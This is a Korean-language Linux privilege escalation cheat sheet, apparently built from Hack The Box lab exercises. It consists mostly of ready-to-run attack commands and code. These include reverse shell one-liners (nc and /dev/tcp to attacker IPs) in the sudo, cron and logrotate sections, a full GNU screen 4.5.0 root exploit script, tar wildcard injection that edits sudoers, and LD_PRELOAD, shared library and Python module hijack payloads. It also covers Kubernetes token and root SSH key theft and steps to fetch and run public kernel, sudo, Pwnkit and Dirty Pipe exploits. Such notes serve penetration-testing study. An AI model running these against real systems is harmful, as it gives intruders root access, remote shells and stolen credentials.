# Linux Privilege Escalation

## 열거

### 현재 프로세스 나열
```ps aux | grep root```<br/>
```ps au```

### 홈 디렉토리 내용
```ls /home```<br/>
```ls -la /home/stacey/```

### SSH 디렉토리 내용
```ls -l ~/.ssh```

### Bash History
```history```

### Sudo - 사용자 권한 나열
```sudo -l```

### Password
```cat /etc/passwd```

### Cron Jobs
```ls -la /etc/cron.daily/```

### 파일 시스템 및 추가 드라이브
```lsblk```

### 쓰기 가능한 디렉토리 찾기
```find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null```

### 쓰기 가능한 파일 찾기
```find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null```

<br/><br/>
## 환경 열거
- 도구 : [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [LinEnum](https://github.com/rebootuser/LinEnum)

### 환경 인식
```cat /etc/os-release```<br/>
```echo $PATH```<br/>
```env```<br/>
```uname -a```<br/>
```lscpu```<br/>
```cat /etc/shells```<br/>
```lsblk```<br/>
```lpstat```<br/>
```cat /etc/fstab```<br/>
```route```<br/>
```arp -a```

### 기존 사용자
```cat /etc/passwd```<br/>
```cat /etc/passwd | cut -f1 -d:```<br/>
```grep "*sh$" /etc/passwd```

#### 해시 알고리즘
| **Algorithm** | **Hash**       |
| ------------- | -------------- |
| Salted MD5    | `$1$`...       |
| SHA-256       | `$5$`...       |
| SHA-512       | `$6$`...       |
| BCrypt        | `$2a$`...      |
| Scrypt        | `$7$`...       |
| Argon2        | `$argon2i$`... |

### 기존 그룹
```cat /etc/group```<br/>
```getent group sudo     # 그룹 맴버 나열```<br/>
```ls /home```

### 마운트된 파일 시스템
```df -h```

### 마운트되지 않은 파일 시스템
```cat /etc/fstab | grep -v "#" | column -t```

### 모든 숨겨진 파일
```find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student```

### 모든 숨겨진 디렉토리
```find / -type d -name ".*" -ls 2>/dev/null```

### 임시 파일
```ls -l /tmp /var/tmp /dev/shm```

<br/><br/>
# Linux 서비스 및 내부 열거

## Internals

### 네트워크 인터페이스
```ip a```

### Hosts
```cat /etc/hosts```

### 사용자의 마지막 로그인
```lastlog```

### 로그인한 사용자
```w```

### Command History
```history```

### Finding History Files
```find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null```

### Cron
```ls -la /etc/cron.daily/```

### Proc
```find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"```

<br/><br/>
## 서비스

### 설치된 패키지
```apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list```

### Sudo Version
```sudo -V```

### Binaries
```ls -l /bin /usr/bin/ /usr/sbin/```

### GTFObins
```for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done```

> 참고 : [GTFObins](https://gtfobins.github.io/)

### Trace System Calls
```strace ping -c1 10.129.112.20```

### Configuration Files
```find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null```

### Scripts
```find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"```

### Running Services by User
```ps aux | grep root```

<br/><br/>
# 자격증명 Hunting
```cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'```<br/>
```find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null```

## SSH 키
```ls ~/.ssh```

<br/><br/>
# Path Abuse
```echo $PATH```<br/>
```pwd && conncheck```

- PATH에 현재 작업 디렉토리 추가
```
PATH=.:${PATH}
export PATH
echo $PATH
```

# Wildcard Abuse
| **Character** | **Significance**                                                              |
| ------------- | ----------------------------------------------------------------------------- |
| `*`           | 파일 이름의 아무리 많은 문자와도 일치할 수 있는 별표.                                               |
| `?`           | 단일 문자와 일치합니다.                                                                 |
| `[ ]`         | 대괄호는 문자를 묶으며 정의된 위치의 모든 문자와 일치할 수 있습니다.                                       |
| `~`           | 시작 부분의 틸드는 사용자 홈 디렉토리의 이름으로 확장되거나 다른 사용자 이름을 추가하여 해당 사용자의 홈 디렉토리를 참조할 수 있습니다. |
| `-`           | 괄호 안의 하이픈은 다양한 문자를 나타냅니다.                                                     |

## cron을 이용한 tar 명령 문제
```
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
```
ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```
```sudo -l```

<br/><br/>
# 제한된 Shell 탈출

- RBASH[Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- RKSH[Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command)
- RZSH[Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) 

## Escaping

### Command injection
```ls -l `pwd` ```<br/>

```
$ echo *
$ echo "$(<flag.txt)"
 또는
$ echo bin/*
$ man -C flag.txt
 또는
$ ssh -t user@<IP> bash # Get directly an interactive shell 
$ ssh user@<IP> -t "bash --noprofile -i" 
$ ssh user@<IP> -t "() { :; }; sh -i "
```

<br/><br/>
# Special Permissions
```find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null```<br/>
```find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null```

## GTFObins
```sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh```

<br/><br/>
# Sudo Rights Abuse
```sudo -l```<br/>

```
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```
```
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

nc -lnvp 443
```

<br/><br/>
# Privileged Groups

## LXC / LXD (Docker와 유사)
```
unzip alpine.zip
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

## Docker

### Disk
```debugfs```

### ADM 
```ls -al /var/log```

<br/><br/>
# Capabilities

## Set Capability
```sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic```

| **Capability**         | **설명**                                                                      |
| ---------------------- | --------------------------------------------------------------------------- |
| `cap_sys_admin`        | 시스템 파일을 수정하거나 시스템 설정을 변경하는 등 관리자 권한으로 작업을 수행할 수 있습니다.                       |
| `cap_sys_chroot`       | 현재 프로세스의 루트 디렉토리를 변경해서 다른 방법으로는 접근할 수 없는 파일과 디렉토리에 접근할 수 있도록 해줍니다.          |
| `cap_sys_ptrace`       | 다른 프로세스에 연결하여 디버깅을 수행할 수 있으므로, 잠재적으로 중요한 정보에 접근하거나 다른 프로세스의 동작을 수정할 수 있습니다. |
| `cap_sys_nice`         | 프로세스의 우선순위를 높이거나 낮출 수 있으며, 이를 통해 원래는 제한되었을 리소스에 접근할 수 있게 됩니다.               |
| `cap_sys_time`         | 시스템 시계를 수정하여 타임스탬프를 조작하거나 다른 프로세스가 예상치 못한 방식으로 작동하도록 할 수 있습니다.              |
| `cap_sys_resource`     | 시스템 리소스 제한(예: 열려 있는 파일 기술자의 최대 수 또는 할당할 수 있는 최대 메모리 양)을 수정할 수 있습니다.         |
| `cap_sys_module`       | 커널 모듈을 로드하고 언로드할 수 있으므로 운영 체제의 동작을 수정하거나 중요한 정보에 액세스할 수 있는 가능성이 있습니다.       |
| `cap_net_bind_service` | 네트워크 포트에 바인딩하여 민감한 정보에 접근하거나 승인되지 않은 작업을 수행할 가능성이 있습니다.                     |

| **Capability Values** | **설명**                                                                                                                                                                 |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                   | 이 값은 실행 파일에 대해 지정된 기능을 설정하지만, 어떠한 권한도 부여하지 않습니다. 실행 파일에 대해 이전에 설정된 기능을 지우고 싶을 때 유용할 수 있습니다.                                                                            |
| `+ep`                 | 이 값은 지정된 기능에 대한 유효하고 허용되는 권한을 실행 파일에 부여합니다. 이를 통해 실행 파일은 기능이 허용하는 작업을 수행할 수 있지만 기능이 허용하지 않는 작업은 수행할 수 없습니다.                                                            |
| `+ei`                 | 이 값은 지정된 기능에 대한 충분하고 상속 가능한 권한을 실행 파일에 부여합니다. 이를 통해 실행 파일은 기능이 허용하는 작업을 수행하고 실행 파일에 의해 생성된 자식 프로세스는 기능을 상속하고 동일한 작업을 수행할 수 있습니다.                                       |
| `+p`                  | 이 값은 지정된 기능에 대해 허용된 권한을 실행 파일에 부여합니다. 이를 통해 실행 파일은 기능이 허용하는 작업을 수행할 수 있지만 기능이 허용하지 않는 작업은 수행할 수 없습니다. 실행 파일에 기능을 부여하지만 기능을 상속하거나 자식 프로세스가 상속하는 것을 방지하려는 경우 유용할 수 있습니다. |

| **Capability**     | **설명**                                                                                        |
| ------------------ | --------------------------------------------------------------------------------------------- |
| `cap_setuid`       | 프로세스가 유효 사용자 ID를 설정할 수 있게 하며, 이를 통해 다른 사용자(`root`사용자 포함)의 권한을 얻을 수 있습니다.                      |
| `cap_setgid`       | 다른 그룹(`root` 그룹 포함)의 권한을 얻는 데 사용할 수 있는 유효 그룹 ID를 설정할 수 있습니다.                                  |
| `cap_sys_admin`    | 이 기능은 시스템 설정 수정, 파일 시스템 마운트 및 언마운트와 같은 `root` 사용자를 위해 예약된 많은 작업을 수행할 수 있는 등 다양한 관리 권한을 제공합니다. |
| `cap_dac_override` | 파일 읽기, 쓰기, 실행 권한 검사를 우회할 수 있습니다.                                                              |

## 기능 열거
```find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;```

## Exploitation
```
$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip

$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
$ su
```

<br/><br/>
# 취약한 서비스

## Screen Version 확인
```screen -v```

## 권한 상승 - Screen_Exploit.sh
```./screen_exploit.sh```

### Screen_Exploit_POC.sh
```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

<br/><br/>
# Cron Job Abuse
```find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null```<br/>

- [pspy](https://github.com/DominicBreuker/pspy) : 다른 사용자가 실행한 명령, cron 작업 등 확인 도구
```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
./pspy64 -pf -i 1000
```

#### 작업 스크립트에 한줄 Reverse Shell 추가
```bash -i >& /dev/tcp/10.10.14.3/443 0>&1```

<br/><br/>
# 컨테이너

## 리눅스 컨테이너

### 리눅스 데몬
- Linux Daemon : [LXD](https://github.com/lxc/lxd)
```
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

<br/><br/>
# 도커

## Docker 권한 상승

### Docker 공유 디렉토리
```cat .ssh/id_rsa```<br/>
```ssh <user>@<host IP> -i <user>.priv```

### Docker 소켓
```
wget https://master.dockerproject.org/linux/x86_64/docker
scp docker <user>@10.129.205.237:~/.

docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

<br/><br/>
# 쿠버네티스

## Control Plane
| **서비스**                 | **TCP 포트**    |
| ----------------------- | ------------- |
| `etcd`                  | `2379`,`2380` |
| `API server`            | `6443`        |
| `Scheduler`             | `10251`       |
| `Controller Manager`    | `10252`       |
| `Kubelet API`           | `10250`       |
| `Read-Only Kubelet API` | `10255`       |

## 쿠버네티스 API
| **Request** | **설명**                     |
| ----------- | -------------------------- |
| `GET`       | 리소스나 리소스 목록에 대한 정보를 검색합니다. |
| `POST`      | 새로운 리소스를 만듭니다.             |
| `PUT`       | 기존 리소스를 업데이트합니다.           |
| `PATCH`     | 리소스에 부분적인 업데이트를 적용합니다.     |
| `DELETE`    | 리소스를 제거합니다.                |

### K8의 API 서버 상호작용
```curl https://10.129.10.11:6443 -k```

### Kubelet API - Extracting Pods
```curl https://10.129.10.11:10250/pods -k | jq .```

### Kubeletctl - Extracting Pods
```kubeletctl -i --server 10.129.10.11 pods```

### Kubelet API - Available Commands
```kubeletctl -i --server 10.129.10.11 scan rce```

### Kubelet API - Executing Commands
```kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx```

## Privilege Escalation

### Kubelet API - Extracting Tokens
```kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token```

### Kubelet API - Extracting Certificates
```kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt```

### List Privileges
```
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

#### Pod YAML
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

### Creating a new Pod
```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```

### Extracting Root's SSH Key
```kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc```

<br/><br/>
# Logrotate
```sudo cat /var/lib/logrotate.status```<br/>
```ls /etc/logrotate.d/```<br/>
```cat /etc/logrotate.d/dpkg```

- [logrotten](https://github.com/whotwagner/logrotten)
```
$ git clone https://github.com/whotwagner/logrotten.git
$ cd logrotten/
$ scp logrotten.c <user>@10.129.204.41:~/.

$ gcc logrotten.c -o logrotten
$ echo 'bash -i >& /dev/tcp/10.10.15.221/9001 0>&1' > payload
$ cat /var/lib/logrotate.status
logrotate state -- version 2
"/home/htb-student/backups/access.log" 2023-6-14-14:1:27

$ nc -lnvp 9001    # 수신 대기
$ ./logrotten -p ./payload /home/htb-student/backups/access.log    # 익스플로잇 실행
$ echo "anything 91byte data" > /backups/access.log     # logrotate 트리거
```

<br/><br/>
# 기타 기술

## 수동 트래픽 캡처
- [net-creds](https://github.com/DanMcInerney/net-creds)
- [PCredz](https://github.com/lgandx/PCredz)

## 약한 NFS 권한
```
showmount -e 10.129.2.12
cat /etc/exports
```

| 옵션               | 설명                                                                                                                                                        |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `root_squash`    | 루트 사용자가 NFS 공유에 액세스하는 데 사용되는 경우 권한이 없는 계정인 `nfsnobody` 사용자로 변경됩니다 . 루트 사용자가 만들고 업로드한 모든 파일은 `nfsnobody`사용자가 소유하므로 공격자가 SUID 비트가 설정된 바이너리를 업로드하는 것을 방지합니다. |
| `no_root_squash` | 로컬 루트 사용자로 공유에 연결하는 원격 사용자는 루트 사용자로 NFS 서버에 파일을 만들 수 있습니다. 이를 통해 SUID 비트가 설정된 악성 스크립트/프로그램을 만들 수 있습니다.                                                    |

```
cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
```
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
./shell
```

## Tmux 세션 하이재킹
```
tmux -S /shareds new -s debugsess
chown root:devs /shareds
ps aux | grep tmux
ls -la /shareds
tmux -S /shareds
```

<br/><br/>
# 커널 익스플로잇

## 커널 익스플로잇 예제
```uname -a```<br/>
```cat /etc/lsb-release```

- [익스플로잇](https://vulners.com/zdt/1337DAY-ID-30003)
```
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```

### 다른 커널 익스플로잇
```
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/refs/heads/main/exploit.c
$ scp exploit.c htb-student@10.129.2.210:~/.

$ gcc -o ex exploit.c
$ ./ex
```

<br/><br/>
# 공유 라이브러리
```ldd /bin/ls```

## LD_PRELOAD 권한 상승
```
$ sudo -l
User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
$ cat > root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

$ gcc -fPIC -shared -o root.so root.c -nostartfiles
$ cp root.so /tmp/.
$ sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl
```

<br/><br/>
# 공유 객체 하이재킹
```ldd payroll```
```
readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
```ls -la /development/```<br/>
```ldd payroll```<br/>
```cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so```<br/>
```./payroll```
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```
```gcc src.c -fPIC -shared -o /development/libshared.so```<br/>
```./payroll ```

<br/><br/>
# 파이썬 라이브러리 하이재킹

## 잘못된 쓰기 권한

### 파이썬 스크립트 - Contents
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

### 모듈 권한
```grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*```<br/>
```ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py```

### 모듈 내용
```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

### 모듈 내용 - 하이재킹
```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

### 권한 상승
```sudo /usr/bin/python3 ./mem_status.py```

<br/><br/>
## Library Path

### PYTHONPATH Listing
```python3 -c 'import sys; print("\n".join(sys.path))'```

### Psutil 기본 설치 위치
```pip3 show psutil```

### 잘못 구성된 디렉토리 권한 (쓰기 권한)
```
ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
```

### 하이재킹된 모듈 콘텐츠 - psutil.py
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

### Python 라이브러리 경로 하이재킹을 통한 권한 상승
```sudo /usr/bin/python3 mem_status.py```

<br/><br/>
## PYTHONPATH 환경 변수

### sudo 권한 확인
```
sudo -l

(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

### PYTHONPATH 환경 변수를 사용한 권한 상승
```sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py```

<br/><br/>
# Sudo
```sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'```<br/>
```sudo -V | head -n1```

- [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156)
```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```
```./sudo-hax-me-a-sandwich```<br/>
```cat /etc/lsb-release```<br/>
```./sudo-hax-me-a-sandwich 1```

## Sudo Policy Bypass
- [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/)
```
sudo -l

    ALL=(ALL) /usr/bin/id
```
```cat /etc/passwd | grep <user>```<br/>
```sudo -u#-1 id```

<br/><br/>
# Polkit (PolicyKit)
```
pkexec -u <user> <command>
pkexec -u root id
```
- [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)
- [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- [PoC](https://github.com/arthepsy/CVE-2021-4034)
- [py버전](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py)
```
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

<br/><br/>
# Dirty Pipe
- [Dirty Pipe](https://dirtypipe.cm4all.com/)
- [CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)
- [Dirty Cow](https://dirtycow.ninja/)
- [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) 

### Download Dirty Pipe Exploit
```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

### Verify Kernel Version
```uname -r```

### Exploitation
```./exploit-1```

### Find SUID Binaries
```find / -perm -4000 2>/dev/null```

### Exploitation
```./exploit-2 /usr/bin/sudo```

<br/><br/>
# Netfilter
- [CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)
- [CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)
- [CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)

### CVE-2021-22555
- 취약한 커널 버전: 2.6 - 5.11
```
uname -r
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

### CVE-2022-25636
- [CVE-2022-25636](https://www.cvedetails.com/cve/CVE-2022-25636/)
- 취약한 커널 버전: 5.4 - 5.6.10
```
uname -r
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

### CVE-2023-32233
- 취약한 커널 버전: 6.3.1 이전
```
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

<br/><br/>
# Linux 강화 - Audit 도구
- [Lynis](https://github.com/CISOfy/lynis)
```./lynis audit system```
